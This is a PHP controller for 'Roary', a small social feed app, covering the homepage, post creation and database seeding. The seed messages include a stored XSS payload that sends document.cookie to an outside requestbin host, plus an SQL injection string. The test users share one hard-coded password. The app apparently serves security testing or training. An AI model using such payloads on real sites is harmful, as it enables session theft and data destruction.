<?php
declare(strict_types=1);

namespace App\Controllers;

use App\Models\Post;
use App\Models\User;

/**
 * HomeController - Handles the homepage and main feed
 */
class HomeController extends Controller
{
    private Post $postModel;
    private User $userModel;

    public function __construct($request, $response, $session, $config)
    {
        parent::__construct($request, $response, $session, $config);
        $this->postModel = new Post();
        $this->userModel = new User();

        // Ensure tables exist
        $this->postModel->createTable();
        $this->userModel->createTable();

        // Ensure admin user exists with environment password
        $this->userModel->createAdminUser();

        // Initialize seed data if needed
        $this->initializeSeedData();
    }

    /**
     * Display the homepage
     */
    public function index(): void
    {
        $this->requireAuth();

        // Get posts for the feed
        $posts = $this->postModel->getAllPosts(100);

        // Format posts for display
        $posts = array_map([$this->postModel, "formatPost"], $posts);

        $data = [
            "title" => "Roary - Where Penguins Roar and Vibes Soar!",
            "posts" => $posts,
            "csrf_token" => $this->session->getCsrfToken(),
            "isLoggedIn" => $this->session->has("username"),
            "username" => $this->session->get("username"),
            "errors" => $this->session->flash("errors") ?? [],
            "old" => $this->session->flash("old") ?? [],
            "messages" => $this->getFlashMessages(),
        ];

        $this->render("home/index", $data);
    }

    /**
     * Handle post creation from homepage
     */
    public function createPost(): void
    {
        $this->requireAuth();

        if ($this->request->getMethod() !== "POST") {
            $this->redirect("/");
            return;
        }

        // Validate CSRF token
        if (!$this->validateCsrf()) {
            $this->session->flash(
                "error",
                "Invalid request. Please try again.",
            );
            $this->redirect("/");
            return;
        }

        // Get post content
        $content = $this->request->post("content", "");
        $username = $this->session->get("username");

        // Validate content
        $errors = $this->postModel->validatePostData($content);

        if (!empty($errors)) {
            $this->session->flash("errors", $errors);
            $this->session->flash("old", ["content" => $content]);
            $this->redirect("/");
            return;
        }

        // Create the post
        $postId = $this->postModel->createPost($username, $content);

        if ($postId) {
            $this->session->flash("success", "Your roar has been posted!");
            error_log("New post created by $username (ID: $postId)");
        } else {
            $this->session->flash(
                "error",
                "Failed to create post. Please try again.",
            );
            error_log("Failed to create post for user: $username");
        }

        $this->redirect("/");
    }

    /**
     * Initialize seed data if database is empty
     */
    private function initializeSeedData(): void
    {
        // Only seed if database is empty
        if ($this->postModel->count() > 0) {
            return;
        }

        // Test users
        $testUsers = [
            [
                "username" => "testuser1",
                "password" => "TestPass1234",
                "avatar" => "🧪",
            ],
            [
                "username" => "FroggyFrank0x539",
                "password" => "TestPass1234",
                "avatar" => "🐸",
            ],
            [
                "username" => "TubularTurtle0x2A",
                "password" => "TestPass1234",
                "avatar" => "🐢",
            ],
            [
                "username" => "SlickSnake25",
                "password" => "TestPass1234",
                "avatar" => "🐍",
            ],
            [
                "username" => "RadicalRex247",
                "password" => "TestPass1234",
                "avatar" => "🦖",
            ],
            [
                "username" => "DynamiteDino1337",
                "password" => "TestPass1234",
                "avatar" => "🦕",
            ],
            [
                "username" => "DoggyDan342",
                "password" => "TestPass1234",
                "avatar" => "🐶",
            ],
            [
                "username" => "CoolCat67",
                "password" => "TestPass1234",
                "avatar" => "🐱",
            ],
            [
                "username" => "ButterflyBetty42",
                "password" => "TestPass1234",
                "avatar" => "🦋",
            ],
        ];

        // Sample messages
        $sampleMessages = [
            "I love cookies!🍪 '<script>window.location.replace(\"https://requestbin.kanbanbox.com/ACB798?\" + document.cookie)</script>'",
            "Is there a seahorse emoji?🐎",
            "Are there any NFL teams that don't end in s?",
            "When will there be soja-döner again??😥",
            "Hey \"@'; DROP TABLE users;--\", how are you doing? 🗑️",
            "Attention, the floor is java! ☕",
            "Why do Java developers wear glasses? Because they don't C# 😎",
            "I'm not procrastinating, I'm just refactoring my time ⏰",
            "404: Motivation not found 😴",
            "Copy-paste from Stack Overflow without reading: 10% of the time, it works every time 📋",
            "There's no place like 127.0.0.1 🏠",
        ];

        // Create test users
        foreach ($testUsers as $userData) {
            $this->userModel->createUser(
                $userData["username"],
                $userData["password"],
                $userData["avatar"],
            );
        }

        // Create sample messages with random timestamps
        $currentTime = time();
        $oneDayAgo = $currentTime - 86400;

        foreach ($sampleMessages as $index => $content) {
            $randomUser = $testUsers[array_rand($testUsers)];
            $randomTime = rand(
                $oneDayAgo,
                $currentTime - (count($sampleMessages) - $index) * 600,
            );

            // Directly insert with custom timestamp
            $sql =
                "INSERT INTO messages (username, content, created_at) VALUES (:username, :content, :created_at)";
            $stmt = $this->postModel->pdo->prepare($sql);
            $stmt->execute([
                "username" => $randomUser["username"],
                "content" => $content,
                "created_at" => $randomTime,
            ]);
        }

        error_log("Seed data initialized");
    }

    /**
     * About page (optional)
     */
    public function about(): void
    {
        $data = [
            "title" => "About Roary",
            "isLoggedIn" => $this->session->has("username"),
            "username" => $this->session->get("username"),
            "messages" => $this->getFlashMessages(),
        ];

        $this->render("home/about", $data);
    }
}
